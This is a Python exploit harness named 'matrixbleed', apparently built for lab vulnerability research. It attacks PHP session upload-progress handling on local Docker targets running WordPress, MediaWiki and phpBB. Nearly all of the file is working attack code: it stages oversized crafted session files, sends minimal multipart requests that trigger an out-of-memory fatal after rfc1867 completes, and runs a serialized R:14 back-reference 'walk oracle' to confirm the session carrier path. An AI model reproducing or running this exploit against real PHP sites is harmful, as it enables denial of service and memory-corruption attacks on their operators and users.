#!/usr/bin/env python3
"""matrixbleed - GLM5-ToB cb-C/cb-D/cb-A lane harness for the NEW matrix
targets (this ARM64 box; :8099 belongs to race-glm4 - never touch).

Per target: (1) producer OOM - stage the oversized-carrier session file,
fire the minimal multipart (PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS +
tiny file part), detect the fatal-alloc signature (in-band, or in the
CONTAINER LOG because these targets run stock php.ini-production with
display_errors=Off); (2) walk oracle - R:14 self-resolve consumer proving
the session carrier path (stale-child discrimination) end-to-end.

Constants follow scripts/wpbleed.py (proven on the x86_64 box) - same
session-file geometry (75MB ps_read buffer + 75MB unserialize copy =
150M > 128M memory_limit, i.e. OOM AFTER rfc1867 completes: ToB's
"normal memory_limit" knob). Serialized data built programmatically
(gotcha #3); session-format 'name|value' (gotcha #4).
"""
import argparse
import base64
import re
import subprocess
import socket
import sys
import uuid
import time
import datetime

BND = b"MATRIXFIRE"
BIG = 75000000
MARKERS = [b"MK%02d-%s" % (i, b"S" * (60 * (i + 1))) for i in range(12)]
WK = b"WALKOK1!"
# Session files must be OWNED by the responding worker uid (rfc1867 opens
# them O_RDWR|O_NOFOLLOW; the fpm root-pool workers run uid=0 WITHOUT
# CAP_DAC_OVERRIDE -> a www-data-owned 600 file is EACCES even for root;
# strace-verified 24-Oct on the wpfpm lane).
STAGE_OWNER = "www-data"


def s(b):
    return f's:{len(b)}:"'.encode() + b + b'";'


def cexec(container, cmd, timeout=20):
    r = subprocess.run(["docker", "compose", "exec", "-T", container, "sh", "-c", cmd],
                       capture_output=True, text=True, timeout=timeout,
                       cwd=subprocess.run(["pwd"], capture_output=True, text=True,
                                          timeout=5).stdout.strip())
    return r.returncode, r.stdout + r.stderr


def logs_since(container, ts):
    """docker logs lines since epoch ts (fatals under display_errors=Off)."""
    r = subprocess.run(["docker", "compose", "logs", "--since",
                        str(max(int(ts) - 1, 0)), "--tail", "80", container],
                       capture_output=True, text=True, timeout=20,
                       cwd=subprocess.run(["pwd"], capture_output=True, text=True,
                                          timeout=5).stdout.strip())
    return r.stdout + r.stderr


def mp_min(sid, host, port, path="/"):
    body = (b"--" + BND + b"\r\n" +
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' +
            sid.encode() + b"\r\n" +
            b"--" + BND + b"\r\n" +
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n' +
            b"--" + BND + b"\r\n" +
            b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nx\r\n" +
            b"--" + BND + b"--\r\n")
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode()
    return head + body


def fire(req, host, port, timeout=25):
    try:
        sock = socket.create_connection((host, port), timeout=15)
        sock.sendall(req)
        sock.settimeout(timeout)
        buf = b""
        while True:
            try:
                d = sock.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
        sock.close()
        return buf
    except ConnectionResetError:
        return b"<RESET>"


def stage_session(container, sid, content_b64, owner=STAGE_OWNER):
    rc, _ = cexec(container, f"echo {content_b64} | base64 -d > /tmp/sess_{sid}; "
                  f"chown {owner}:{owner} /tmp/sess_{sid}; chmod 600 /tmp/sess_{sid}")
    return rc == 0


def producer_fire(container, host, port, path, big=BIG, owner=STAGE_OWNER):
    """Stage marker+OOM session file, fire; returns (fatal_alloc, sid)."""
    sid = "mx" + uuid.uuid4().hex[:29]
    head = b"".join(b"p%d|" % i + s(MARKERS[i]) for i in range(12)) + \
           b'poc|a:2:{i:0;' + s(b"abc") + b'i:1;s:%d:"' % big
    h64 = base64.b64encode(head).decode()
    t64 = base64.b64encode(b'";}').decode()
    rc, _ = cexec(container,
                  f"F=/tmp/sess_{sid}; rm -f $F; echo {h64} | base64 -d > $F; "
                  f"head -c {big} /dev/zero | tr '\\0' 'A' >> $F; "
                  f"echo {t64} | base64 -d >> $F; "
                  f"chown {owner}:{owner} $F; chmod 600 $F")
    assert rc == 0, "producer staging failed"
    t0 = time.time()
    resp = fire(mp_min(sid, host, port, path), host, port)
    body = resp.partition(b"\r\n\r\n")[2]
    m = re.search(rb"tried to allocate (\d+)", body)
    alloc = int(m.group(1)) if m else None
    logsrc = "in-band"
    if alloc is None:
        logs = logs_since(container, t0)
        m = re.search(rb"tried to allocate (\d+)", logs.encode())
        if m:
            alloc = int(m.group(1))
            logsrc = "container-log (display_errors=Off - production ini)"
    return alloc, sid, logsrc


WALK_TOKEN = b'k|a:2:{i:0;' + s(WK) + b'i:1;R:14;}'


def walk_oracle(container, host, port, path, owner=STAGE_OWNER):
    """R:14 self-resolve consumer: fire, then read the session file back."""
    sid = "mx" + uuid.uuid4().hex[:29]
    assert stage_session(container, sid, base64.b64encode(WALK_TOKEN).decode(), owner)
    fire(mp_min(sid, host, port, path), host, port)
    rc, fcontent = cexec(container, "cat /tmp/sess_%s 2>/dev/null" % sid)
    return WK.decode() in fcontent, (fcontent or "")[:120]


def run_target(name, container, host, port, path, rounds, big=BIG, owner=STAGE_OWNER):
    print(f"=== {name} (http://{host}:{port}{path}) ===")
    rep = {"target": name, "url": f"http://{host}:{port}{path}",
           "ts": datetime.datetime.now(datetime.timezone.utc).isoformat(),
           "producers": [], "walk": None}
    ok = 0
    for rnd in range(rounds):
        alloc, sid, logsrc = producer_fire(container, host, port, path, big, owner)
        if alloc is None:
            print(f"  [{rnd}] producer no-fatal signature; retrying")
            rep["producers"].append({"round": rnd, "fatal_alloc": None})
            continue
        print(f"  [{rnd}] producer OOM: tried to allocate {alloc} ({logsrc})")
        rep["producers"].append({"round": rnd, "fatal_alloc": alloc, "logsrc": logsrc})
        ok += 1
        delivered, rt = walk_oracle(container, host, port, path, owner)
        print(f"  [{rnd}] walk oracle: {'DELIVERED + WALKED' if delivered else 'fresh child (retry next round)'}"
              f" | round-trip: {rt!r}")
        rep["walk"] = {"delivered": delivered, "roundtrip": rt}
        if delivered:
            break
    rep["producer_oom"] = ok > 0
    print(f"  => {name}: producer_OOM={rep['producer_oom']} "
          f"walk_delivered={bool(rep['walk'] and rep['walk']['delivered'])}")
    return rep


TARGETS = {
    # (log container, http host, port, path, stage owner): the fpm-lane
    # fatal lands in wpfpm (fpm worker stderr) logs, not the nginx front;
    # root-pool workers need root-owned session files (no DAC_OVERRIDE).
    "wp-fpm":   ("wpfpm",       "127.0.0.1", 8103, "/index.php", "root"),
    "mediawiki": ("mediawiki",  "127.0.0.1", 8104, "/index.php", "www-data"),
    "phpbb":    ("phpbb",       "127.0.0.1", 8105, "/phpBB3/index.php", "www-data"),
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("targets", nargs="+", choices=list(TARGETS) + ["all"])
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--big", type=int, default=BIG)
    args = ap.parse_args()
    sel = list(TARGETS) if "all" in args.targets else args.targets
    for t in sel:
        container, host, port, path, owner = TARGETS[t]
        run_target(t, container, host, port, path, args.rounds, args.big, owner)


if __name__ == "__main__":
    sys.exit(main())
